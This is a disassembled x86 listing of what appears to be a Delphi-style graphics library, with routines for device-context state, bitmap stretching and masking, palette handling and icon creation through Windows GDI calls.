call sub_41ce58
sub_41d104
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41d128
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41ce80
pop ecx
pop edx
pop edi
pop esi
retn
sub_41d148
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41d174
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
mov eax [ ebp + 0x8 ]
call sub_41bd78
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41d1dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41d23c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41d1dc
mov edx esp
mov eax ebx
call sub_41d104
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d128
sub_41d290
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41d32c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
test bl 0x8
je r-xdata
mov eax esi
call sub_41d358
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41d388
sub_41d32c
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41c24c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd78
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41d358
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41c74c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41d388
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41ca38
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41ca38
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41cb18
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41c9fc
call sub_41bd78
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41c9fc
call sub_41bd78
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41d4ac
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d4fd
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41d500
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41d4ac
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4041dc
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5a3
lea eax [ ebp - 0x104 ]
call sub_403f6c
retn
sub_41d5b8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41d500
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41d500
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d70d
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41d718
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41d74c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41d5a8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41d5a8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9d3
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41d5a8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406844
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9d3
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41d9e0
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41da18
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c40
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41da90
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41dae8
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028b8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dbec
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41dc00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41dc98
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028b8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41da90
mov eax esp
call sub_41dc00
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41dd3c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41da90
mov [ esp ] eax
sub_41dd90
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41d738
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41d718
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41d5a8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41d5b8
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de69
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41d4ac
sub_41de69
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41d738
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41d5a8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41d5b8
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df23
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41df58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41dfe8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079a8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41d4ac
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0d8
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e0d8
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41df4c
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_4079a8
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41dd90
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_4079a8
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
